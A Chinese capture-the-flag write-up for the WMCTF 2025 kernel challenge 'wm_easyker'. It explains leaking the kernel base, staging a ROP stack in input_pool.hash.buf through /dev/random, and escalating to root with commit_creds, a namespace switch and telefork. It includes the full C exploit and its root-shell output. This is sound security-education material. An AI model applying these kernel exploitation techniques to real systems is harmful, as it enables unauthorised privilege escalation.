# wm_easyker

## 题目简述

题目是 Linux 6.6.98 内核模块利用，设备 `/dev/wmeasyker` 暴露两个关键 primitive：一次任意地址读，以及一次可控跳转/可控 `rsp`。附件 `run.sh` 以 `qemu-system-x86_64` 启动 512 MB 内存、`qemu64,+smep,+smap`、`kaslr`，并把 flag 作为只读 virtio drive 挂载。旧题 `sycrop` 的利用思路在本题环境里不能直接复用，因为 Linux 6.2 之后 per-CPU entry area 加入随机化，且 QEMU 关闭了 `-enable-kvm` 和 `--cpu host`，entry_bleed 与 ret2dir 路线都被间接封掉。

## 解题过程

### 漏洞与可复用外链结论

该题目的漏洞比较明显,可以任意地址读一次,并且可以控制rsp寄存器的值，漏洞来源于sctf2023中的[sycrop](https://github.com/pray77/CVE-2023-3640)，但是区别在于该题目使用的内核为`6.6.98`,正如原题目中所述，在linux 6.2之后, per cpu entry area加入了随机化，因此原文章中的利用手法就不再适用了，同时还关闭了`-enable-kvm`、 `--cpu host`，使得entry_bleed也不再适用。间接disable掉了`ret2dir`方法的利用。

`sycrop` 外链提供的是“可控内核栈/跳转后做内核 ROP”的旧环境背景；本题真正采用的是 u1f383 在 KernelCTF 文章中总结的 `input_pool.hash.buf` 技巧：向 `/dev/random` 写入大块数据时，可以影响内核随机数池 `input_pool.hash.buf` 中的内容。由于 `input_pool` 地址能由泄露出的 kernel base 推出，它可以被当作一块概率可控的临时 ROP 栈。

该利用手法简言之就是可以控制&input_pool.hash.buf中的内容，并且input_pool是可以通过泄露kernel_base来计算出来的。知道这种方法，利用也就变的简单了。

通过调试我们发现，我们数据的u64[0x1fff9]偏移处非常大概率会被写入到&input_pool.hash.buf中，因此可以通过多次尝试来提高正确率。

> 原文章提到了该利用手法的两个限制，即buf中的内容并不是持久化的以及写入数据的位置是随机的(即不知道我们写入的数据哪一部分会被写入到&input_pool.hash.buf中)，同时文中也提出了解决方案, 因此也可以使用文章中的解决方案来进行更加稳定的利用。

接着我们可以通过控制rsp来跳到&input_pool.hash.buf上面，在上面写入rop_chain来调用copy_from_user进行"栈"拓展, 接着再接一段rop chain，然后可以使用`kylebot`提出的[telefork](https://blog.kylebot.net/2022/10/16/CVE-2022-1786/#Telefork-teleport-back-to-userspace-using-fork)方法来返回用户态。Telefork 的关键思想是内核 ROP 中调用 `vfork`/`fork` 类路径，把执行带回一个可控用户态上下文，避免直接手写完整 KPTI trampoline 返回链。

完整exp如下

exp 依赖 `banzi.h` 中的日志、`SYSCHK` 和常用 exploit helper 宏；核心逻辑仍在下方代码中。

```c
#include <banzi.h>

#define AAR 0x8888
#define JAW 0x9999
#define WRITE_RANDOM_SIZE 0x100000ul


struct in_args {
    uint64_t addr;
    char* buf;
};
struct jmp_args {
    uint64_t addr;
};
int fd = -1;
int aar(uint64_t addr, char* buf) {
    struct in_args args = { .addr = addr, .buf = buf };
    int ret = ioctl(fd, AAR, &args);
    if (ret < 0) {
        loge("Failed to read from kernel: %s", strerror(errno));
        return -1;
    }
    return 0;

}
int jmp_address(uint64_t addr) {
    struct jmp_args args = { .addr = addr };
    int ret = ioctl(fd, JAW, &args);
    if (ret < 0) {
        loge("Failed to jump to address: %s", strerror(errno));
        return -1;
    }
    return 0;
}

int main() {
    int random_fd = -1;
    unsigned long* random_data;
    fd = open("/dev/wmeasyker", O_RDWR);
    if (fd < 0) {
        loge("Failed to open /dev/wmeasyker");
        return 1;
    }
    char* buf = calloc(1, 0x20000);
    aar(0xfffffe0000000004, buf);
    kernel_base = *(uint64_t*)(buf);
    kernel_base = kernel_base - 0x1008e00;
    logi("Kernel base: 0x%lx", kernel_base);
    uint64_t input_pool_addr = kernel_base + (0xffffffff82bd1780 - 0xffffffff81000000);
    logi("Input pool address: 0x%lx", input_pool_addr);
    SYSCHK(random_fd = open("/dev/random", O_WRONLY));
    SYSCHK(random_data = mmap(NULL, WRITE_RANDOM_SIZE, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0));
    memset(buf, '\x00', 0x1000);
    uint64_t* addr = buf;
    uint64_t index = 0;
    // commit_creds(&init_cred);
    addr[index++] = kernel_base + (0xffffffff81081c4d - 0xffffffff81000000); // pop_rdi_ret
    addr[index++] = kernel_base + (0xffffffff82a50f60 - 0xffffffff81000000); // init_cred
    addr[index++] = kernel_base + (0xffffffff810c38b0 - 0xffffffff81000000); // commit_creds
    // switch_task_namespaces(find_task_by_vpid(1), &init_nsproxy);
    addr[index++] = kernel_base + (0xffffffff81081c4d - 0xffffffff81000000); // pop_rdi_ret
    addr[index++] = 1;
    addr[index++] = kernel_base + (0xffffffff810b8ce0 - 0xffffffff81000000); // find_task_by_vpid
    addr[index++] = kernel_base + (0xffffffff8106a167 - 0xffffffff81000000); // pop_rbx_ret
    addr[index++] = input_pool_addr + 0x3168 + 0x80; // input_pool_addr
    addr[index++] = kernel_base + (0xffffffff8122fe84 - 0xffffffff81000000); // push rax; jmp qword ptr [rbx];
    addr[index++] = kernel_base + (0xffffffff8125173e - 0xffffffff81000000); // pop_rsi_ret
    addr[index++] = kernel_base + (0xffffffff82a50a80 - 0xffffffff81000000); // init_nsproxy
    addr[index++] = kernel_base + (0xffffffff810c1670 - 0xffffffff81000000); // switch_task_namespaces
    // telefork
    addr[index++] = kernel_base + (0xffffffff8108e7a0 - 0xffffffff81000000); // __x64_sys_vfork
    addr[index++] = kernel_base + (0xffffffff81081c4d - 0xffffffff81000000); // pop_rdi_ret
    addr[index++] = 0x1000000;
    addr[index++] = kernel_base + (0xffffffff8113f6b0 - 0xffffffff81000000); // msleep
    addr[index++] = kernel_base + (0xffffffff81081c4d - 0xffffffff81000000); // pop_rdi_ret
    memset(random_data, 'X', WRITE_RANDOM_SIZE);
    random_data[0x1fff9 - 1] = kernel_base + (0xffffffff81081c4d - 0xffffffff81000000); // pop_rdi_ret
    random_data[0x1fff9] = input_pool_addr + 0x3168;
    random_data[0x1fff9 + 1] = kernel_base + (0xffffffff8125173e - 0xffffffff81000000); // pop_rsi_ret
    random_data[0x1fff9 + 2] = addr; // addr
    random_data[0x1fff9 + 3] = kernel_base + (0xffffffff813115e2 - 0xffffffff81000000); // pop_rdx_ret
    random_data[0x1fff9 + 4] = 0x1000;
    random_data[0x1fff9 + 5] = kernel_base + (0xffffffff815a2730 - 0xffffffff81000000);//copy_from_user
    write(random_fd, random_data, WRITE_RANDOM_SIZE);
    jmp_address(input_pool_addr + 0x30);
    SYSCHK(setns(open("/proc/1/ns/mnt", O_RDONLY), 0));
    char* args[] = { "/bin/sh", "-i", NULL };
    execve(args[0], args, NULL);
}
```

本地测试时，exp 泄露出的关键信息和提权结果形如：

```text
[+] ./wmctf_easyker_bak.c:48 Kernel base: 0xffffffff9aa00000
[+] ./wmctf_easyker_bak.c:50 Input pool address: 0xffffffff9c5d1780
/ # cat /flag
WMCTF{EXAMPLE_FLAG}
```

![wm_easyker 本地提权输出](<WMCTF2025-wm-easyker-wp/banzi-h.png>)

## 方法总结

- 核心技巧：一次任意读泄露 kernel base，计算 `input_pool` 地址后用 `/dev/random` 写入概率布置 ROP 栈，再通过可控 `rsp` 跳到 `input_pool.hash.buf` 执行内核 ROP。
- 识别信号：内核题若只能控 `rsp` 或跳转一次，传统 entry area、entry_bleed、ret2dir 又不可用，应考虑内核中可由用户态写入影响的全局缓冲区作为临时栈。
- 复用要点：`input_pool.hash.buf` 内容位置和持久性都不稳定，exp 需要容错或多次尝试；ROP 第一阶段调用 `copy_from_user` 扩展栈，第二阶段再执行提权、切 namespace 和返回用户态。
